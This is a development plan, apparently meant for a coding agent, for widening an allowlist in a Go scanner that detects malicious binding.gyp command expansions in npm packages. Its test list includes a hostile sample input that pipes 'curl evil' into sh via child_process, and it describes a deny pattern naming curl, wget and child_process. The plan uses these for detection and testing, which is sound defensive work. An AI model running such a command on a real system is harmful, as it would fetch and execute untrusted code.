# Plan: fix exec-key allowlist false-positive on `node -e "require('nan')"` idiom

## The bug (confirmed live)

The P1 fix (commit `2b414d4`, "escalate quiet command expansion in
libraries/cflags/ldflags/include_dirs") false-positives on **node-sass** and
every other package that uses the `nan` header-lookup idiom. Verified by
fetching the real package from the npm registry and running it through the
tarball inspector: `flagged=true severity=critical`.

The trigger, from node-sass's real `package/binding.gyp`:

```python
'include_dirs': [
  '<!(node -e "require(\'nan\')")',
],
```

This is the **standard, legitimate** way packages using `nan` (Native
Abstractions for Node) locate their C++ headers — structurally identical to the
already-allowlisted `node -p "require('node-addon-api').include"`. A false
CRITICAL here refuses `npm install node-sass` on the hot path: a supply-chain
DoS against a legitimate, widely-used package.

## Root cause

`allowedNodePrintExpansion` in `internal/gypscan/gypscan.go` (~line 498) allows
the `-e`/`--eval` branch ONLY when the body contains `console.log` AND
(`node-addon-api` OR `.include`). The `nan` idiom uses bare `require('nan')` —
no `console.log`, no `node-addon-api`, no `.include` — so it falls through to
CRITICAL. The spec that produced this was too narrow; this plan widens it
**precisely**, not loosely.

## The fix — recognize the `require('<known-native-helper>')` idiom

In `internal/gypscan/gypscan.go`, rewrite `allowedNodePrintExpansion` (and add a
small helper) so a `node -p`/`-e` command expansion is allowed when, AND ONLY
when, its body is a **pure native-addon-helper path lookup**. Precise predicate:

1. The command base name is `node` / `nodejs` (already dispatched here).
2. The body uses `-p`/`--print` OR `-e`/`--eval` (an actual eval/print flag —
   not a bare `node script.js`).
3. The body does NOT match `localJSPathRe` (no package-local `.js`/`.cjs`/`.mjs`
   file path — that stays CRITICAL; a worm's payload lives in a local script).
4. The body does NOT match `payloadShellRe` (no `;`, `&&`, `||`, `|`, backticks,
   `$(...)`, redirection, `curl`/`wget`/`eval`/`child_process`, etc. — already
   checked by the caller `allowedExecKeyExpansion`, but re-assert defensively).
5. **NEW — the core widening:** the eval/print expression, after stripping the
   flag token and the surrounding quotes, must reference ONLY a known
   native-build-helper module via `require(...)`. Concretely, define:

   ```go
   // nativeHelperModules are the npm packages whose sole job is to expose a
   // native-addon header/include path. The canonical, legitimate binding.gyp
   // idiom is `<!(node -p "require('<helper>').include")` or
   // `<!(node -e "require('<helper>')")` to locate those headers at configure
   // time. Allowlisting these by EXACT module name keeps node-sass / nan-based
   // and node-addon-api-based packages installable without giving a worm a
   // place to hide: there is nothing executable to smuggle into
   // `require('nan')`.
   var nativeHelperModules = []string{
       "nan",
       "node-addon-api",
       "bindings",
       "node-gyp-build",
   }
   ```

   The expression is allowed iff it contains a `require('<helper>')` /
   `require("<helper>")` call whose argument is EXACTLY one of
   `nativeHelperModules` (match the quoted literal exactly — `require('nan')`,
   not `require('nanpwned')` or `require('nan/evil')`), AND the remainder of the
   expression after removing the `require('<helper>')` call(s) contains no other
   `require(`, no `import(`, no `process`, no `(` that forms a call other than
   the allowed `console.log(...)` wrapper, and no statement separator. Keep it
   simple and conservative: allow these shapes and nothing else:
     - `require('<helper>')`
     - `require('<helper>').<identifier>`         (e.g. `.include`)
     - `console.log(require('<helper>'))`
     - `console.log(require('<helper>').<identifier>)`
     - `process.stdout.write(require('<helper>')...)`  (optional; only if trivially safe)

   Implementation approach (regex over the unquoted expression is fine here, it
   is a small grammar): build a regex like
   `^(?:console\.log\(|process\.stdout\.write\()?\s*require\(\s*['"]<helper>['"]\s*\)(?:\.[A-Za-z_$][\w$]*)?\s*\)?\s*;?\s*$`
   parameterized over the exact helper names (regexp.QuoteMeta each). The
   expression must match this ANCHORED pattern in full — anchoring is what keeps
   a worm from appending `; doEvil()`.

6. Anything else stays CRITICAL (default-deny). In particular:
   `node -e "<arbitrary code>"`, `node -e "require('some-other-pkg')"`,
   `node ./local.js`, multi-statement bodies, and any helper name not on the
   exact allowlist remain flagged.

KEEP the existing `node-addon-api`/`.include`/`console.log` allowance working
(it is a subset of the new predicate — verify the new predicate still clears it,
then you may remove the old narrower branch to avoid two code paths).

## Tests (in `internal/gypscan/gypscan_test.go`)

ADD, and keep all existing exec-key tests green:

- **The regression that started this:** `<!(node -e "require('nan')")` in
  `include_dirs` → NOT flagged (None for an otherwise-clean native addon). Use
  the exact node-sass shape including escaped quotes.
- `<!(node -p "require('node-addon-api').include")` → still None (existing).
- `<!(node -e "require('bindings')('x.node')")` — hmm, this one CALLS the
  result; decide per predicate: `require('bindings')('x.node')` is a call with an
  argument, which the anchored pattern does NOT allow → it should stay CRITICAL.
  Add it as a CRITICAL case and document that `bindings` is allowlisted only for
  the bare path-lookup shape, not when invoked. (This is the safe default.)
- **Still-CRITICAL guards (must not regress to clean):**
  - `<!(node -e "require('nan'); require('child_process').exec('curl evil|sh')")`
    → CRITICAL (statement separator + second require).
  - `<!(node scripts/emit-cflag.js)` → CRITICAL (local .js).
  - `<!(node -e "require('evil-pkg')")` → CRITICAL (helper not on allowlist).
  - `<!(node -e "require('nan/../evil')")` / `require('nanXXX')` → CRITICAL
    (not an exact helper-name match).
- Run the FULL `internal/gypscan` + `internal/scan/gyp` + `internal/gypscan/tarball`
  suites; every prior test stays green.

## Acceptance — including a LIVE false-positive gate

This fix exists because the unit tests passed while a real package broke, so the
acceptance bar MUST include real packages:

1. `go build ./...`, `go vet ./internal/gypscan/... ./internal/scan/gyp/...`,
   `go test ./...` all clean/green.
2. `gofmt -l` reports none of the touched files.
3. **LIVE GATE (required):** there is an env-gated test
   `internal/gypscan/tarball/live_real_test.go` (build tag `livegyp`,
   `VETO_TEST_TGZ=<path>`) that asserts a real tarball is NOT flagged. Fetch
   these real packages with
   `npm pack <pkg>@latest --ignore-scripts --pack-destination <dir> --silent`
   (npm binary: ~/.local/share/mise/installs/node/24.7.0/bin/npm — if that is a
   veto wrapper, use its `.veto-original` sibling) and run each through the
   livegyp test; ALL must be `flagged=false`:
     - node-sass   (the nan idiom — the one that broke)
     - better-sqlite3, bcrypt, sharp, ssh2, canvas  (regression set)
     - nan         (the helper package itself)
     - bcrypt is node-addon-api; node-sass is nan; canvas uses nan too — good spread.
   Paste the pass/fail line for each into your summary. If ANY legit package is
   flagged, the predicate is still too tight — fix it before claiming done.

## Commit

Single commit on branch `gyp-detector-coverage-fixes`:
`gypscan: allowlist the require('<native-helper>') header-lookup idiom (fix node-sass false-Critical)`
